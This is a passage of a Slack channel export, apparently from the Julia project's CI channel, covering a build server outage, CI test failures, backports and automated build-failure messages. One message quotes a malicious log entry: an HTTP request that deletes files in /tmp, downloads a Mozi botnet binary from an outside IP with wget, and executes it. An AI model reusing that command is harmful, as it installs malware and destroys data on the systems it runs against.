"},{"type":"link","url":"http://build.julialang.org","text":"build.julialang.org"},{"type":"text","text":" being down?"}]}]}]},{"client_msg_id":"2134df39-489d-4800-950d-052021c57edf","type":"message","text":"Ran out of disk space again?","user":"U674T3KB3","ts":"1615345795.071900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"q17","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Ran out of disk space again?"}]}]}]},{"client_msg_id":"d82ae6f9-95f0-46b3-9b11-3d8c641e7e8d","type":"message","text":"no, I reloaded the build configuration to fix a reversion that Jameson and I needed to push, and it upgraded Buildbot to 3.0 which had backwards-incompatible syntax changes","user":"U66GD0880","ts":"1615349683.072600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"bE+r","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"no, I reloaded the build configuration to fix a reversion that Jameson and I needed to push, and it upgraded Buildbot to 3.0 which had backwards-incompatible syntax changes"}]}]}]},{"client_msg_id":"b7625fee-2396-4d3e-a908-17edfed7edc1","type":"message","text":"I just made the necessary changes to get it working again","user":"U66GD0880","ts":"1615349692.073000","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"7kxJI","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"I just made the necessary changes to get it working again"}]}]}]},{"client_msg_id":"4ae6390f-fa10-497f-8bc6-73576ed7021b","type":"message","text":"Watching the logs, saw a naughty request come in….\n```\"GET /shell?cd+/tmp;rm+-rf+*;wget+<http://178.175.67.81:42183/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws> HTTP/1.1\"```","user":"U66GD0880","ts":"1615352311.073400","team":"T68168MUP","edited":{"user":"U66GD0880","ts":"1615352317.000000"},"blocks":[{"type":"rich_text","block_id":"J3x47","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Watching the logs, saw a naughty request come in….\n"}]},{"type":"rich_text_preformatted","elements":[{"type":"text","text":"\"GET /shell?cd+/tmp;rm+-rf+*;wget+"},{"type":"link","url":"http://178.175.67.81:42183/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"},{"type":"text","text":" HTTP/1.1\""}]}]}],"thread_ts":"1615352311.073400","reply_count":4,"reply_users_count":1,"latest_reply":"1615352865.075500","reply_users":["U7THT3TM3"],"subscribed":false},{"type":"message","subtype":"bot_message","text":"Builder tester_macos64 on tabularasa_macos-x86_64-macmini failed: <https://build.julialang.org/#builders/11/builds/1533>","ts":"1615386290.076200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_macos64 on tabularasa_macos-x86_64-macmini failed: <https://build.julialang.org/#builders/11/builds/1538>","ts":"1615399390.076300","bot_id":"B01FNM61TE0"},{"client_msg_id":"296af74c-8980-4a80-bd91-09fb42ff70ce","type":"message","text":"CI failures on x86 and x86-64 Linux in <https://github.com/JuliaLang/julia/pull/39977> lookin' pretty sus","user":"U680THK2S","ts":"1615400418.076800","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"WQgMr","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"CI failures on x86 and x86-64 Linux in "},{"type":"link","url":"https://github.com/JuliaLang/julia/pull/39977"},{"type":"text","text":" lookin' pretty sus"}]}]}]},{"client_msg_id":"dd4fb4b9-284c-4ba1-bb12-98c830f257aa","type":"message","text":"x86-64 is FileWatching and x86 is some kind of timeout/sigterm","user":"U680THK2S","ts":"1615400436.077200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"uG6","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"x86-64 is FileWatching and x86 is some kind of timeout/sigterm"}]}]}]},{"client_msg_id":"7d802dec-687a-4426-9bf6-6eaad3cf77ce","type":"message","text":"Are these known?","user":"U680THK2S","ts":"1615400448.077400","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"2nkK","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Are these known?"}]}]}]},{"client_msg_id":"aa1f1b3c-a14e-43a4-8e15-23e9148a90f7","type":"message","text":"x86 is <https://github.com/JuliaLang/julia/pull/39544> / <https://github.com/JuliaLang/julia/pull/39574> / Tar bug","user":"U67BXBF99","ts":"1615402773.077700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"q1B","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"x86 is "},{"type":"link","url":"https://github.com/JuliaLang/julia/pull/39544"},{"type":"text","text":" / "},{"type":"link","url":"https://github.com/JuliaLang/julia/pull/39574"},{"type":"text","text":" / Tar bug"}]}]}]},{"client_msg_id":"266d6a84-6e68-4521-a938-cea6ebcdb096","type":"message","text":"Are we missing a backport for FileWatching? I think Keno had done a related patch, but seemed like awhile ago","user":"U67BXBF99","ts":"1615402835.078400","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"Zv+n","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Are we missing a backport for FileWatching? I think Keno had done a related patch, but seemed like awhile ago"}]}]}]},{"client_msg_id":"3652b48c-1e3f-4a28-a9f5-b5436cc957c2","type":"message","text":"<@U674T3KB3>?","user":"U680THK2S","ts":"1615403106.078600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"GdTUT","elements":[{"type":"rich_text_section","elements":[{"type":"user","user_id":"U674T3KB3"},{"type":"text","text":"?"}]}]}]},{"client_msg_id":"f210e4bf-9a1e-4ec4-a244-9350f32fca06","type":"message","text":"Are you thinking of <https://github.com/JuliaLang/julia/pull/38407>?","user":"U680THK2S","ts":"1615403276.079100","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"DJlYc","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Are you thinking of "},{"type":"link","url":"https://github.com/JuliaLang/julia/pull/38407"},{"type":"text","text":"?"}]}]}]},{"client_msg_id":"3514a5fd-6d34-4a60-adcd-d5aed7f1f75b","type":"message","text":"yeah, seems right","user":"U67BXBF99","ts":"1615403304.079300","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"d8a","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"yeah, seems right"}]}]}]},{"client_msg_id":"eb222421-7825-434c-90ea-ee848d3aa666","type":"message","text":"<https://github.com/JuliaLang/julia/pull/39978>","user":"U680THK2S","ts":"1615403649.079500","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"Xgy9o","elements":[{"type":"rich_text_section","elements":[{"type":"link","url":"https://github.com/JuliaLang/julia/pull/39978"}]}]}]},{"client_msg_id":"d046c64d-fcc9-46f6-b2f0-cc9595ad269a","type":"message","text":"ah, I guess that must have been just after branching, so it missed the backport label","user":"U67BXBF99","ts":"1615403938.079900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"La75u","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"ah, I guess that must have been just after branching, so it missed the backport label"}]}]}]},{"type":"message","subtype":"bot_message","text":"Builder tester_linux64 on tabularasa_linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/71/builds/1571>","ts":"1615412330.080000","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_freebsd64 on tabularasa_freebsd-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/4/builds/1568>","ts":"1615425028.080100","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_win64 on tabularasa_win-x86_64-aws_3 failed: <https://build.julialang.org/#builders/66/builds/1553>","ts":"1615452714.080200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_macos64 on tabularasa_macos-x86_64-macmini failed: <https://build.julialang.org/#builders/11/builds/1556>","ts":"1615457033.080300","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux64 on tabularasa_linux-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/71/builds/1616>","ts":"1615497108.080400","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux32 on tabularasa_linux-i686-amdci6_1 failed: <https://build.julialang.org/#builders/83/builds/1373>","ts":"1615497501.080500","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_macos64 on tabularasa_macos-x86_64-macmini failed: <https://build.julialang.org/#builders/11/builds/1575>","ts":"1615506587.080600","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux64 on tabularasa_linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/71/builds/1625>","ts":"1615508151.080700","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux32 on tabularasa_linux-i686-amdci6_3 failed: <https://build.julialang.org/#builders/83/builds/1381>","ts":"1615508735.080800","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux64 on tabularasa_linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/71/builds/1630>","ts":"1615512323.080900","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux32 on tabularasa_linux-i686-amdci6_1 failed: <https://build.julialang.org/#builders/83/builds/1388>","ts":"1615516608.081000","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linuxaarch64 on tabularasa_linux-aarch64-aws_7 failed: <https://build.julialang.org/#builders/1/builds/1596>","ts":"1615523296.081700","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder tester_linux32 on tabularasa_linux-i686-amdci6_3 failed: <https://build.julialang.org/#builders/83/builds/1403>","ts":"1615546687.081800","bot_id":"B01FNM61TE0"},{"client_msg_id":"45bd0314-37c1-4c2c-8f8a-acfdea4be211","type":"message","text":"Builder tester_macos64 on tabularasa_maxos-x86_64-macmini failed: <https://build.julialang.org/#/builders/11/builds/1590>\n\nLooks like the same error as the above macos failures. Slightly confused because my PR had been all green yesterday and I didn't push any changes since?","user":"U01HD5VFXJM","ts":"1615554904.083800","team":"T68168MUP","edited":{"user":"U01HD5VFXJM","ts":"1615554910.000000"},"blocks":[{"type":"rich_text","block_id":"dyIy0","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Builder tester_macos64 on tabularasa_maxos-x86_64-macmini failed: "},{"type":"link","url":"https://build.julialang.org/#/builders/11/builds/1590"},{"type":"text","text":"\n\nLooks like the same error as the above macos failures. Slightly confused because my PR had been all green yesterday and I didn't push any changes since?"}]}]}]},{"type":"message","subtype":"bot_message","text":"Builder tester_macos64 on tabularasa_macos-x86_64-macmini2 failed: <https://build.julialang.org/#builders/11/builds/1593>","ts":"1615558836.084100","bot_id":"B01FNM61TE0"}]}